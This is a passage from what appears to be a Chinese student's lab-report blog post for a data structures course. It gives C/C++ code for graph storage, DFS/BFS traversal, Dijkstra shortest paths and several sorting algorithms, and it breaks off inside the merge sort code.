<h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><h3 id="1-图的邻接矩阵存储及深度优先和宽度优先遍历"><a href="#1-图的邻接矩阵存储及深度优先和宽度优先遍历" class="headerlink" title="1.图的邻接矩阵存储及深度优先和宽度优先遍历"></a>1.<strong>图的邻接矩阵存储及深度优先和宽度优先遍历</strong></h3><p>a) 已知图的邻接矩阵结构定义如下：</p>
<pre><code class="line-numbers language-c">//邻接矩阵的结构体定义

typedef struct mGraph{

  ElemType **a;   //邻接矩阵

  int n;      //图的当前顶点数

  int e;      //图的当前边数

  ElemType noEdge; //两顶点间无边时的值

}mGraph;
</code></pre>
<p>参照程序9.1~9.4，编写程序，完成邻接矩阵的初始化、撤销和边的搜索、插入、删除等操作。 </p>
<p>b)以上述邻接矩阵为存储结构，编写程序，实现图的深度、宽度优先遍历。 </p>
<p><strong>源码：</strong></p>
<pre><code class="line-numbers language-c">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;math.h&gt;
#include&lt;windows.h&gt;
#include&lt;queue&gt;
#define ERROR 0
#define OK 1
#define Overflow 2  //表示上溢
#define Underflow 3  //表示下溢
#define NotPresent 4 //表示元素不存在
#define Duplicate 5  //表示有重复元素
typedef int ElemType;
typedef int Status;
 
//邻接矩阵的结构体定义
typedef struct mGraph{
    ElemType **a;     //邻接矩阵
    int n;            //图的当前顶点数
    int e;            //图的当前边数
    ElemType noEdge;  //两顶点间无边时的值
}mGraph;
 
 
//循环队列的结构体定义
typedef struct{
    int front;
    int rear;
    int maxSize;    //最大容量
    ElemType *element;
}Queue;
 
 
//创建一个能容纳mSize个单元的空队列
void Create(Queue *Q,int mSize){
    Q-&gt;maxSize=mSize;
    Q-&gt;element=(ElemType*)malloc(sizeof(ElemType)*mSize);
    Q-&gt;front=Q-&gt;rear=0;
}
 
 
//判断队列是否为空,若是,则返回TRUE;否则返回FALSE
BOOL IsEmpty(Queue *Q){
    return Q-&gt;front==Q-&gt;rear;
}
 
 
//判断队列是否已满,若是,则返回TRUE,否则返回FALSE
BOOL IsFULL(Queue *Q){
    return (Q-&gt;rear+1)%Q-&gt;maxSize==Q-&gt;front;
}
 
 
//获取队头元素,并通过x返回.若操作成功,则返回TRUE,否则返回FALSE
BOOL Front(Queue *Q,ElemType *x){
    if(IsEmpty(Q))      //空队列处理
        return FALSE;
    *x=Q-&gt;element[(Q-&gt;front+1)%Q-&gt;maxSize];
    return TRUE;
}
 
 
//入队.在队列Q的队尾插入元素x(入队操作)。操作成功,则返回TRUE,否则返回FALSE
BOOL EnQueue(Queue *Q,ElemType x){
    if(IsFULL(Q))      //溢出处理
        return FALSE;
    Q-&gt;rear=(Q-&gt;rear+1)%Q-&gt;maxSize;
    Q-&gt;element[Q-&gt;rear]=x;
    return TRUE;
}
 
 
//出队.从队列Q中删除队头元素(出队操作)。操作成功,则返回TRUE,否则返回FALSE
BOOL DeQueue(Queue *Q){
    if(IsEmpty(Q)){   //空队列处理
        return FALSE;
    }
    Q-&gt;front=(Q-&gt;front+1)%Q-&gt;maxSize;
    return TRUE;
}
 
 
//邻接矩阵的初始化
Status Init(mGraph *mg,int nSize,ElemType noEdgeValue){
    int i,j;
    mg-&gt;n = nSize;               //初始化顶点数
    mg-&gt;e = 0;                   //初始化时没有边
    mg-&gt;noEdge = noEdgeValue;    //初始化没有边时的取值
    mg-&gt;a = (ElemType**)malloc(nSize*sizeof(ElemType *));  //生成长度为n的一维指针数组
    if(!mg-&gt;a) return ERROR;
    for(i = 0;i &lt; mg-&gt;n;i ++){   //动态生成二维数组
        mg-&gt;a[i] = (ElemType*)malloc(nSize*sizeof(ElemType));
        for(j = 0;j &lt; mg-&gt;n;j ++){
            mg-&gt;a[i][j] = mg-&gt;noEdge;
        }
        mg-&gt;a[i][i] = 0;        //自回路设置为0
    }
    return OK;
}
 
 
//邻接矩阵的撤销,先释放一维数组,再释放指针数组
int Destory(mGraph *mg){
    int i;
    for(i = 0;i &lt; mg-&gt;n;i ++){
        free(mg-&gt;a[i]);  //释放n个一维数组的存储空间
    }
    free(mg-&gt;a);         //释放一维数组的存储空间
    return 1;
}
 
 
//邻接矩阵的边的搜索
Status Exist(mGraph *mg,int u,int v){
    if(u &lt; 0||v &lt; 0||u &gt; mg-&gt;n-1||v &gt; mg-&gt;n-1 ||u == v||mg-&gt;a[u][v] == mg-&gt;noEdge) return ERROR;
    return OK;
}
 
 
//邻接矩阵的边的插入
Status Insert(mGraph *mg,int u,int v,ElemType w){
    if(u &lt; 0||v &lt; 0||u &gt; mg-&gt;n-1||v &gt; mg-&gt;n-1 ||u == v) return ERROR;
    if(mg-&gt;a[u][v] != mg-&gt;noEdge) return Duplicate;  //若待插入边已存在,则返回出错信息
    mg-&gt;a[u][v] = w;                                 //插入新边
    mg-&gt;e ++;                                        //增加一条边
    return OK;
}
 
 
//邻接矩阵的边的删除
Status Remove(mGraph *mg,int u,int v){
    if(u &lt; 0||v &lt; 0||u &gt; mg-&gt;n-1||v &gt; mg-&gt;n-1 ||u == v) return ERROR;
    if(mg-&gt;a[u][v] == mg-&gt;noEdge) return NotPresent;  //若待删除边不存在,则返回出错信息
    mg-&gt;a[u][v] = mg-&gt;noEdge;                         //删除边
    mg-&gt;e --;
    return OK;
}
 
 
//邻接矩阵的单一顶点DFS
void DFS(int v,int visited[],mGraph g){
    int j;
    printf("%d ",v);              //访问顶点v
    visited[v] = 1;               //为顶点v打上访问标记       
    for(j = 0;j &lt; g.n; j++){      //遍历v的邻接点
        if(!visited[j] &amp;&amp; g.a[v][j] &gt; 0){  //当未被访问且有权值
            DFS(j,visited,g);
        }
    }
}
 
 
//邻接矩阵的全图DFS
void DFSGraph(mGraph g){
    int i;
    int *visited = (int*)malloc(g.n * sizeof(int)); //动态生成标记数组visted
    for(i = 0;i &lt; g.n;i ++){
        visited[i] = 0;          //visted数组初始化
    }                            //visted数组初始化
    for(i = 0;i &lt; g.n;i ++){     //逐一检查每个顶点,若未被访问,则调用DFS
        if(!visited[i]){   //当未被访问且有权值
            DFS(i,visited,g);
        }
    }                      
    free(visited);                       //释放visted数组
}
 
 
//邻接矩阵的单一顶点BFS
void BFS(int v,int visited[],mGraph g){
    Queue q;
    Create(&amp;q,g.n);                        //初始化队列
    visited[v] = 1;                        //为顶点v打上访问标记
    printf("%d ",v);                       //访问顶点v
    EnQueue(&amp;q,v);                         //将顶点v放入队列
    while(!IsEmpty(&amp;q)){
        Front(&amp;q,&amp;v);
        DeQueue(&amp;q);                       //队首顶点出队列
        for(int i = 0;i &lt; g.n;i ++){       //遍历v的每一项
            if(!visited[i] &amp;&amp; g.a[v][i] &gt; 0){       //若未被访问且有权值,则将其访问并放入队列,注意这里判断的是g.a[v][i]二维数组
                visited[i] = 1;
                printf("%d ",i);
                EnQueue(&amp;q,i);
            }
        }
    }
}
 
 
//邻接矩阵的全图BFS
void BFSGraph(mGraph g){
    int i;
    int *visited = (int*)malloc(g.n * sizeof(int));  //动态生成visited数组
    for(i = 0;i &lt; g.n;i ++){                         //初始化visited数组
        visited[i] = 0;
    }
    for(i = 0 ;i &lt; g.n;i ++){                        //逐一检查每个顶点,若未被访问,则调用BFS
        if(!visited[i]){
            BFS(i,visited,g);
        }
    }
    free(visited);
}
 
 
void OutPut(mGraph g)
{
    int i, j;
    printf(" ");
    for (j = 0; j &lt; g.n; j++)
        printf("%4d", j);
    printf("\n");
    for (i = 0; i &lt; g.n; i++)
    {
        printf("%d", i);
        for (j = 0; j &lt; g.n; j++)
            printf("%4d", g.a[i][j]);
        printf("\n");
    }
}
 
 
int main(){
    mGraph g;
    int nSize,edge,u,v,i;
    ElemType w;
    printf("Please enter the size of the mgraph:");
    scanf("%d",&amp;nSize);
    Init(&amp;g,nSize,-1);
    printf("Please enter the number of the edges:");
    scanf("%d",&amp;edge);
    printf("Now init the graph.\n");
    
    for(i = 0;i &lt; edge;i ++){
        printf("Please enter the %dth edge:",i);
        scanf("%d%d%d",&amp;u,&amp;v,&amp;w);
        Insert(&amp;g,u,v,w);
    }
    // nSize = 6;
    // edge = 10;
    // Init(&amp;g,nSize,-1);
    // Insert(&amp;g,0,1,50);
    // Insert(&amp;g,0,2,10);
    // Insert(&amp;g,0,4,80);
    // Insert(&amp;g,1,2,15);
    // Insert(&amp;g,1,4,20);
    // Insert(&amp;g,2,3,15);
    // Insert(&amp;g,3,1,20);
    // Insert(&amp;g,3,4,45);
    // Insert(&amp;g,5,3,9);
    // Insert(&amp;g,5,4,10);
    printf("\n\nThe adjacency matrix is:\n\n");
    OutPut(g);
    printf("\n");
    printf("DFS:\n");
    DFSGraph(g);
    printf("\nBFS:\n");
    BFSGraph(g);
    // system("pause");
    return 0;

}


</code></pre>
<h3 id="2-图的邻接表存储及深度优先和宽度优先遍历"><a href="#2-图的邻接表存储及深度优先和宽度优先遍历" class="headerlink" title="2.图的邻接表存储及深度优先和宽度优先遍历"></a>2.<strong>图的邻接表存储及深度优先和宽度优先遍历</strong></h3><p>   a)已知图的邻接表结构定义如下：</p>
<pre><code class="line-numbers language-c">//邻接表的结构体定义

typedef struct ENode{

  int adjVex;       //任意顶点u相邻的顶点

  ElemType w;       //边的权值

  struct ENode *nextArc;  //指向下一个边结点

}ENode;

 

typedef struct{

  int n;      //图的当前顶点数

  int e;      //图的当前边数

  ENode **a;    //指向一维指针数组

}LGraph;
</code></pre>
<p>参照程序9.6~9.10，编写程序，完成邻接表的初始化、撤销和边的搜索、插入、删除等操作。</p>
<p>b)以上述邻接表为存储结构，编写程序，完成图的深度、宽度优先遍历。</p>
<p><strong>源码：</strong></p>
<pre><code class="line-numbers language-C">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include &lt;windows.h&gt;
#define ERROR 0
#define OK 1
#define Overflow 2      //表示上溢
#define Underflow 3     //表示下溢
#define NotPresent 4    //表示元素不存在
#define Duplicate 5     //表示有重复元素
typedef int ElemType;
typedef int Status;
 
 
//邻接表的结构体定义
typedef struct ENode{
    int adjVex;              //任意顶点u相邻的顶点
    ElemType w;              //边的权值
    struct ENode *nextArc;   //指向下一个边结点
}ENode;
 
typedef struct{
    int n;           //图的当前顶点数
    int e;           //图的当前边数
    ENode **a;       //指向一维指针数组
}LGraph;
 
 
//循环队列的结构体定义
typedef struct{
    int front;
    int rear;
    int maxSize;    //最大容量
    ElemType *element;
}Queue;
 
 
//创建一个能容纳mSize个单元的空队列
void Create(Queue *Q,int mSize){
    Q-&gt;maxSize=mSize;
    Q-&gt;element=(ElemType*)malloc(sizeof(ElemType)*mSize);
    Q-&gt;front=Q-&gt;rear=0;
}
 
 
//判断队列是否为空,若是,则返回TRUE;否则返回FALSE
BOOL IsEmpty(Queue *Q){
    return Q-&gt;front==Q-&gt;rear;
}
 
 
//判断队列是否已满,若是,则返回TRUE,否则返回FALSE
BOOL IsFULL(Queue *Q){
    return (Q-&gt;rear+1)%Q-&gt;maxSize==Q-&gt;front;
}
 
 
//获取队头元素,并通过x返回.若操作成功,则返回TRUE,否则返回FALSE
BOOL Front(Queue *Q,ElemType *x){
    if(IsEmpty(Q))      //空队列处理
        return FALSE;
    *x=Q-&gt;element[(Q-&gt;front+1)%Q-&gt;maxSize];
    return TRUE;
}
 
 
//入队.在队列Q的队尾插入元素x(入队操作)。操作成功,则返回TRUE,否则返回FALSE
BOOL EnQueue(Queue *Q,ElemType x){
    if(IsFULL(Q))      //溢出处理
        return FALSE;
    Q-&gt;rear=(Q-&gt;rear+1)%Q-&gt;maxSize;
    Q-&gt;element[Q-&gt;rear]=x;
    return TRUE;
}
 
 
//出队.从队列Q中删除队头元素(出队操作)。操作成功,则返回TRUE,否则返回FALSE
BOOL DeQueue(Queue *Q){
    if(IsEmpty(Q)){   //空队列处理
        return FALSE;
    }
    Q-&gt;front=(Q-&gt;front+1)%Q-&gt;maxSize;
    return TRUE;
}
 
 
//邻接表的初始化
Status Init(LGraph *lg,int nSize){
    int  i;
    lg-&gt;n = nSize;
    lg-&gt;e = 0;
    lg-&gt;a = (ENode**)malloc(nSize*sizeof(ENode*)); //动态生成长度为n的一维指针数组
    if(!lg-&gt;a) return ERROR;
    else{
        for(i = 0;i &lt; lg-&gt;n;i ++){
            lg-&gt;a[i] = NULL;                       //将指针数组a置空
        }
        return OK;
    }
}
 
 
//邻接表的搜索边
Status Exist(LGraph *lg,int u,int v){
    ENode *p;
    if(u &lt; 0||v &lt; 0||u &gt; lg-&gt;n-1||v &gt; lg-&gt;n-1 ||u == v) return ERROR;
    p = lg-&gt;a[u];                 //指针p指向顶点u的单链表的第一个边结点
    while(p &amp;&amp; p-&gt;adjVex != v){
        p = p-&gt;nextArc;
    }
    if(!p) return ERROR;          //若未找到此边,则返回ERROR
    else return OK;
}
 
 
//邻接表的插入边
Status Insert(LGraph *lg,int u,int v,ElemType w){
    ENode *p;
    if(u &lt; 0||v &lt; 0||u &gt; lg-&gt;n-1||v &gt; lg-&gt;n-1 ||u == v) return ERROR;
    if(Exist(lg,u,v)) return Duplicate;       //此边已存在,返回错误
    p = (ENode*)malloc(sizeof(ENode));        //为新的边结点分配存储空间
    p-&gt;adjVex = v;
    p-&gt;w = w;
    p -&gt; nextArc = lg-&gt;a[u];                  //将新的边结点插入单链表的最前面
    lg-&gt;a[u] = p;
    lg-&gt;e ++;                                 //边加1
    return OK;
}
 
 
//邻接表的单一顶点DFS
void DFS(int v,int visited[],LGraph g){
    ENode *w;
    printf("%d ",v);                           //访问顶点v
    visited[v] = 1;                            //为顶点v打上访问标记
    for(w = g.a[v];w;w = w-&gt;nextArc){          //遍历v的邻接点
        if(!visited[w-&gt;adjVex]){
            DFS(w-&gt;adjVex,visited,g);          //若w未被访问,则递归调用DFS
        }
    }
}
 
 
//邻接表的全图DFS
void DFSGraph(LGraph g){
    int i;
    int *visited = (int*)malloc(g.n * sizeof(int)); //动态生成标记数组visted
    for(i = 0;i &lt; g.n;i ++){
        visited[i] = 0;                             //visted数组初始化
    }
    for(i = 0;i &lt; g.n;i ++){                        //逐一检查每个顶点,若未被访问,则调用DFS
        if(!visited[i]){
            DFS(i,visited,g);
        }
    }
    free(visited);                                 //释放visted数组
}
 
 
//邻接表的单一顶点BFS
void BFS(int v,int visited[],LGraph g){
    ENode *w;
    Queue q;
    Create(&amp;q,g.n);                        //初始化队列
    visited[v] = 1;                        //为顶点v打上访问标记
    printf("%d ",v);                       //访问顶点v
    EnQueue(&amp;q,v);                         //将顶点v放入队列
    while(!IsEmpty(&amp;q)){
        Front(&amp;q,&amp;v);
        DeQueue(&amp;q);                       //队首顶点出队列
        for(w = g.a[v];w;w = w-&gt;nextArc){  //遍历v的所有邻接点
            if(!visited[w-&gt;adjVex]){       //若w未被访问,则将其访问并放入队列
                visited[w-&gt;adjVex] = 1;
                printf("%d ",w-&gt;adjVex);
                EnQueue(&amp;q,w-&gt;adjVex);
            }
        }
    }
}
 
 
//邻接表的全图BFS
void BFSGraph(LGraph g){
    int i;
    int *visited = (int*)malloc(g.n * sizeof(int));  //动态生成visited数组
    for(i = 0;i &lt; g.n;i ++){                         //初始化visited数组
        visited[i] = 0;
    }
    for(i = 0 ;i &lt; g.n;i ++){                        //逐一检查每个顶点,若未被访问,则调用BFS
        if(!visited[i]){
            BFS(i,visited,g);
        }
    }
    free(visited);
}
void OutPut(LGraph g)
{
    int i;
    ENode *p;
    for (i = 0; i &lt; g.n;i++)
    {
            printf("%d ",i);
            p = g.a[i];
            for (p; p ;p = p-&gt;nextArc)
        {
            printf("--&gt;%2d|%2d ",p-&gt;adjVex,p-&gt;w);
        }
        printf("\n");
    }
}
 
 
 
 
int main(){
    LGraph g;
    int i,u,v,enode,edge;
    ElemType w;
    // printf("Please enter the number of the ENodes:");
    // scanf("%d",&amp;enode);
    // Init(&amp;g,enode);
    // printf("Please enter the number of the edges:");
    // scanf("%d",&amp;edge);
    // printf("Now init the graph.\n");
    // for(i = 0;i &lt; edge;i ++){
    //     printf("Please enter the edge:");
    //     scanf("%d%d%d",&amp;u,&amp;v,&amp;w);
    //     Insert(&amp;g,u,v,w);
    // }
    enode = 6;
    edge = 10;
    Init(&amp;g,enode);
    Insert(&amp;g,0,1,50);
    Insert(&amp;g,0,2,10);
    Insert(&amp;g,0,4,80);
    Insert(&amp;g,1,2,15);
    Insert(&amp;g,1,4,20);
    Insert(&amp;g,2,3,15);
    Insert(&amp;g,3,1,20);
    Insert(&amp;g,3,4,45);
    Insert(&amp;g,5,3,9);
    Insert(&amp;g,5,4,10);
    printf("\n\n The adjacency list is:\n\n");
    OutPut(g);
    printf("\n DFS:\n");
    DFSGraph(g);
    printf("\n\n BFS:\n");
    BFSGraph(g);
    // system("pause");
    return 0;
}
</code></pre>
<h3 id="3-最佳路径选择问题"><a href="#3-最佳路径选择问题" class="headerlink" title="3.最佳路径选择问题"></a>3.<strong>最佳路径选择问题</strong></h3><p>​    编写程序，实现智能交通中的最佳路径选择：设有n个地点，编号为0~n-1，m条路径的起点、终点和代价由用户输入提供，采用上述<strong>邻接表</strong>作为存储结构，寻找最佳路径方案（如花费时间最少、路径长度最短、交通费用最小等，任选其一即可）</p>
<p><strong>源码：</strong></p>
<pre><code class="line-numbers language-C">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include &lt;windows.h&gt;
#define ERROR 0
#define OK 1
#define Overflow 2      //表示上溢
#define Underflow 3     //表示下溢
#define NotPresent 4    //表示元素不存在
#define Duplicate 5     //表示有重复元素
#define INFTY 32767    //表示极大值正无穷
typedef int ElemType;
typedef int Status;
 
 
//邻接表的结构体定义
typedef struct ENode{
    int adjVex;              //任意顶点u相邻的顶点
    ElemType w;              //边的权值
    struct ENode *nextArc;   //指向下一个边结点
}ENode;
 
typedef struct{
    int n;           //图的当前顶点数
    int e;           //图的当前边数
    ENode **a;       //指向一维指针数组
}LGraph;
 
 
//循环队列的结构体定义
typedef struct{
    int front;
    int rear;
    int maxSize;    //最大容量
    ElemType *element;
}Queue;
 
 
//创建一个能容纳mSize个单元的空队列
void Create(Queue *Q,int mSize){
    Q-&gt;maxSize=mSize;
    Q-&gt;element=(ElemType*)malloc(sizeof(ElemType)*mSize);
    Q-&gt;front=Q-&gt;rear=0;
}
 
 
//判断队列是否为空,若是,则返回TRUE;否则返回FALSE
BOOL IsEmpty(Queue *Q){
    return Q-&gt;front==Q-&gt;rear;
}
 
 
//判断队列是否已满,若是,则返回TRUE,否则返回FALSE
BOOL IsFULL(Queue *Q){
    return (Q-&gt;rear+1)%Q-&gt;maxSize==Q-&gt;front;
}
 
 
//获取队头元素,并通过x返回.若操作成功,则返回TRUE,否则返回FALSE
BOOL Front(Queue *Q,ElemType *x){
    if(IsEmpty(Q))      //空队列处理
        return FALSE;
    *x=Q-&gt;element[(Q-&gt;front+1)%Q-&gt;maxSize];
    return TRUE;
}
 
 
//入队.在队列Q的队尾插入元素x(入队操作)。操作成功,则返回TRUE,否则返回FALSE
BOOL EnQueue(Queue *Q,ElemType x){
    if(IsFULL(Q))      //溢出处理
        return FALSE;
    Q-&gt;rear=(Q-&gt;rear+1)%Q-&gt;maxSize;
    Q-&gt;element[Q-&gt;rear]=x;
    return TRUE;
}
 
 
//出队.从队列Q中删除队头元素(出队操作)。操作成功,则返回TRUE,否则返回FALSE
BOOL DeQueue(Queue *Q){
    if(IsEmpty(Q)){   //空队列处理
        return FALSE;
    }
    Q-&gt;front=(Q-&gt;front+1)%Q-&gt;maxSize;
    return TRUE;
}
 
 
//邻接表的初始化
Status Init(LGraph *lg,int nSize){
    int  i;
    lg-&gt;n = nSize;
    lg-&gt;e = 0;
    lg-&gt;a = (ENode**)malloc(nSize*sizeof(ENode*)); //动态生成长度为n的一维指针数组
    if(!lg-&gt;a) return ERROR;
    else{
        for(i = 0;i &lt; lg-&gt;n;i ++){
            lg-&gt;a[i] = NULL;                       //将指针数组a置空
        }
        return OK;
    }
}
 
 
//邻接表的搜索边
Status Exist(LGraph *lg,int u,int v){
    ENode *p;
    if(u &lt; 0||v &lt; 0||u &gt; lg-&gt;n-1||v &gt; lg-&gt;n-1 ||u == v) return ERROR;
    p = lg-&gt;a[u];                 //指针p指向顶点u的单链表的第一个边结点
    while(p &amp;&amp; p-&gt;adjVex != v){
        p = p-&gt;nextArc;
    }
    if(!p) return ERROR;          //若未找到此边,则返回ERROR
    else return OK;
}
 
 
//邻接表的插入边
Status Insert(LGraph *lg,int u,int v,ElemType w){
    ENode *p;
    if(u &lt; 0||v &lt; 0||u &gt; lg-&gt;n-1||v &gt; lg-&gt;n-1 ||u == v) return ERROR;
    if(Exist(lg,u,v)) return Duplicate;       //此边已存在,返回错误
    p = (ENode*)malloc(sizeof(ENode));        //为新的边结点分配存储空间
    p-&gt;adjVex = v;
    p-&gt;w = w;
    p -&gt; nextArc = lg-&gt;a[u];                  //将新的边结点插入单链表的最前面
    lg-&gt;a[u] = p;
    lg-&gt;e ++;                                 //边加1
    return OK;
}


int Choose(int *d, int *s,int n) //选出最小的d[i]，将i加入S，i∈V-S
{
    int i,minpos,min;
    min=INFTY;
    minpos=-1;
    for(i=0;i&lt;n;i++)
    {
        if(d[i]&lt;min&amp;&amp;!s[i])
        {
            min=d[i];
            minpos=i;
        }
    }
    return minpos;
 } 
 Status Dijkstra(int v,int *d,int *path,LGraph *lg)//迪杰斯特拉算法求路径 
 {
     int i,j,k,w;
     int distance = 0;
     ENode *p;
     p=lg-&gt;a[v];//工作指针 
     int *s;

     if(v&lt;0||v&gt;lg-&gt;n-1)
     {
         return ERROR;
     }

     s=(int*)malloc(sizeof(int)*lg-&gt;n);
     for(i=0;i&lt;lg-&gt;n ;i++)
     {
         s[i]=0;
         path[i]=-1;
         d[i]=INFTY;
     }

     while(p)//初始化 
     {
         d[p-&gt;adjVex ]=p-&gt;w ;
         if(p-&gt;adjVex!=v&amp;&amp;d[p-&gt;adjVex ]&lt;INFTY)
         {
             path[p-&gt;adjVex ]=v;
         }
         p=p-&gt;nextArc ;
    } //对各个数组初始化 
     s[v]=1;
     d[v]=0;
     for(i=1;i&lt;lg-&gt;n ;i++)
     {

         k=Choose(d,s,lg-&gt;n );
         if(k==-1)
         {
             continue;
         } //判断是否选择了有效结点 
         s[k]=1;
         p=lg-&gt;a[k];
         if(p==NULL)
         {
             continue ;
         }
         while(p)
         {
             if(!s[p-&gt;adjVex ]&amp;&amp;d[k]+p-&gt;w &lt;d[p-&gt;adjVex ])//更新d和path 
             {
                 d[p-&gt;adjVex ]=d[k]+p-&gt;w ;
                 path[p-&gt;adjVex ]=k;
                //  distance = d[p-&gt;adjVex];
             }
             p=p-&gt;nextArc ;
         }
        
     }

     return OK;
 }

  void OutPut(LGraph *lg)//此函数用于输出路径 
 {
     int u,v;
     printf("\nplease input the origin (u) and destination (v):\n");
    scanf("%d %d",&amp;u,&amp;v);
    int d[lg-&gt;n];
    int path[lg-&gt;n];
    Dijkstra(u,d,path,lg);
    printf("The shortest path length between %d and %d is: %d\n",u,v,d[v]);
    printf("\nThe path detail: ");
    if (path[v] == -1)
    {
        printf(" Not exist!\n");
        return; 
     }
     while (path[v]!=-1)
      {
        printf("%d &lt;-- ",v);
         v=path[v];
     }
     printf("%d\n",u);
 }



int main(){
    LGraph g;
    int nSize,edge,u,v,i;
    int d[100];
    int path[100];
    ElemType w;
    printf("Please enter the size of the mgraph: ");
    scanf("%d",&amp;nSize);
    Init(&amp;g,nSize);
    printf("Please enter the number of the edges: ");
    scanf("%d",&amp;edge);
    printf("\n");
    for(i = 0;i &lt; edge;i ++){
        printf("Please enter the %d edge: ",i);
        scanf("%d%d%d",&amp;u,&amp;v,&amp;w);
        Insert(&amp;g,u,v,w);
    }
    // nSize = 6;
    // edge = 10;
    // Init(&amp;g,nSize);
    // Insert(&amp;g,0,1,50);
    // Insert(&amp;g,0,2,10);
    // Insert(&amp;g,0,4,80);
    // Insert(&amp;g,1,2,15);
    // Insert(&amp;g,1,4,20);
    // Insert(&amp;g,2,3,15);
    // Insert(&amp;g,3,1,20);
    // Insert(&amp;g,3,4,45);
    // Insert(&amp;g,5,3,9);
    // Insert(&amp;g,5,4,10);

    Dijkstra(0,d,path,&amp;g);
    OutPut(&amp;g);
    // system("pause");
    return 0;
}
</code></pre>
<h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><h3 id="各种内排序算法的实现和性能比较"><a href="#各种内排序算法的实现和性能比较" class="headerlink" title="各种内排序算法的实现和性能比较"></a>各种内排序算法的实现和性能比较</h3><p>1.已知待排序序列以顺序表存储，数据元素以及表结构定义如下：</p>
<pre><code class="line-numbers language-c">typedef struct entry //数据元素

{

  KeyType key;   //排序关键词，KeyType应该为可以比较类型

  DataType data;  //data包含数据元素中的其他数据项

} Entry;

 

typedef struct list  //顺序表

{

  int n;      //待排序数据元素数量

  Entry D[MaxSize]; //静态数组存储数据元素

} List;
</code></pre>
<p>参照程序10.1~10.7，编写算法，分别实现顺序表的简单选择排序、直接插入排序、冒泡排序、快速排序、两路合并排序以及堆排序。</p>
<p>2.编写算法，利用随机函数，在文件中随机产生n个关键字（关键字定义为整型数据）。</p>
<p>3.编写程序，分别验证简单选择排序、直接插入排序、冒泡排序、快速排序、两路合并排序以及堆排序，在待排关键字个数为500、10000、50000、100000时，完成排序所需要的时间（单位：毫秒）</p>
<p>4.将排序结果存放于Excel工作表中，并以图表（簇状柱形图）的方式显示。</p>
<p><strong>源码：</strong></p>
<pre><code class="line-numbers language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;time.h&gt;
#include &lt;windows.h&gt;
#define MaxSize 50000


typedef int KeyType;
typedef int DataType;
typedef struct entry  //数据元素
{
    KeyType key;      //排序关键词，KeyType应该为可以比较类型
    DataType data;    //data包含数据元素中的其他数据项
} Entry;

typedef struct list   //顺序表
{
    int n;            //待排序数据元素数量
    Entry D[MaxSize]; //静态数组存储数据元素
} List;


//简单选择排序算法
int FindMin(List list,int StartIndex)  //在startIndex至表尾范围内找到最小关键字元素下标
{
    int MInIndex = StartIndex;
    int i;
    for (i = StartIndex+1; i &lt; list.n;i++)
    {
        if(list.D[i].key&lt;list.D[MInIndex].key)
        {
            MInIndex = i;
        }
    }
    return MInIndex;
}
void Swap(Entry *D ,int i,int j)  //交换顺序表中两元素位置
{
    Entry temp;
    if(i==j)
        return;
    temp = *(D + i);
    *(D + i) = *(D+j);
    *(D + j) = temp;
}
void SelectSort(List *list)
{
    int i,MinIndex;
    int StartIndex = 0;
    // for (i = 0; i &lt; list-&gt;n;i++)
    // {
    //     MinIndex=FindMin(*list, StartIndex);
    //     Swap(list-&gt;D, i, MinIndex);
    //     StartIndex++;
    // }
    while(StartIndex&lt;list-&gt;n)
    {
        MinIndex=FindMin(*list, StartIndex);
        Swap(list-&gt;D, StartIndex, MinIndex);
        StartIndex++;  
    }
}

//直接插入排序
void InsertSort(List *list)
{
    int i, j;   //i为待插入元素下标
    for (i = 1; i &lt; list-&gt;n; i++)  //每一趟待插入元素
    {
        Entry insertItem = list-&gt;D[i];
        for (j = i - 1; j &gt;= 0; j--)
        {   //不断将有序序列中元素向后移动，为待插入元素空出一个位置
            if (insertItem.key &lt; list-&gt;D[j].key)
                list-&gt;D[j + 1] = list-&gt;D[j];
            else break;
        }
        list-&gt;D[j + 1] = insertItem;   //待插入元素有序存放至有序序列中
    }
}

//冒泡排序
void BubbleSort(List* list) 
{
    int i, j;     //i标识每趟排序范围最后一个元素下标，每趟排序元素下标范围是0~i
    bool isSwap = false;   //标记一趟排序中是否发生了元素交换
    for (i =list-&gt;n - 1; i &gt; 0; i--)
    {
        for (j = 0; j &lt; i; j++)
        {
            if (list-&gt;D[j].key &gt; list-&gt;D[j + 1].key)
            {
                Swap(list-&gt;D, j, j + 1);
                isSwap = true;
            }
        }
        if (!isSwap) break;   //如果本趟排序没有发生元素交换，排序完成
    }
}

//划分
int Partition(List *list,int low,int high)
{
    int i = low, j = j = high + 1;  //注意是high+1
    Entry pivot = list-&gt;D[low];  //pivot是分划元素
    do
    {
        do
        {
            i++;
        }  while (i&lt;=high &amp;&amp; list-&gt;D[i].key&lt;pivot.key);
        do
        {
            j--;
        }  while (list-&gt;D[j].key&gt;pivot.key);
        if(i&lt;j)
            Swap(list-&gt;D,i,j);   //若i&lt;j，交换D[i]与D[j]
    }  while (i&lt;j);
    Swap(list-&gt;D,low,j);    //若i&gt;=j,交换D[low]与D[j]
    return j;
}
//快速排序的递归函数
void QuickSort(List *list,int low ,int high)
{
    int k;
    if(low&lt;high)
    {
        k = Partition(list,low,high);
        QuickSort(list,low,k-1);  //递归排序（low，k-1）
        QuickSort(list,k+1,high); //递归排序（k+1，high）
    }
}
//快速排序的主调用函数
void QuickSort(List *list)
{
    QuickSort(list,0,list-&gt;n-1);
}



void Merge(List *list,int left,int mid,int right)
{
    int *Temp = new int[right - left + 1];
    // int *Temp = (int *)malloc(sizeof(int)*list-&gt;n);
    int i = left, j = mid + 1, k = 0;
    while((i&lt;=mid)&amp;&amp;(j&lt;=right))
    {       //每次把比较小的放进Temp里
        if(list-&gt;D[i].key&lt;=list-&gt;D[j].key)
            Temp[k++] = list-&gt;D[i++].key;
        else
            Temp[k++] = list-&gt;D[j++].key;
    }
        
        while(i&lt;=mid)  Temp[k++] = list-&gt;D[i++].key;    //将剩余元素复制到Temp
        while(j&lt;=right)  Temp[k++] = list-&gt;D[j++].key;
        for (i = 0, k = left; k &lt;= right;)
            list-&gt;D[k++].key = Temp[i++];
}
//快速排序的递归函数
void MergeSort(List *list,int left,int right)
{
    if(left&lt;right)
    {
        int mid = left + (right-left) / 2;    //二分选择中间值
        MergeSort(list,left, mid);            //递归排序左半部分
        MergeSort(list, mid + 1, right);      //递归排序右半部分
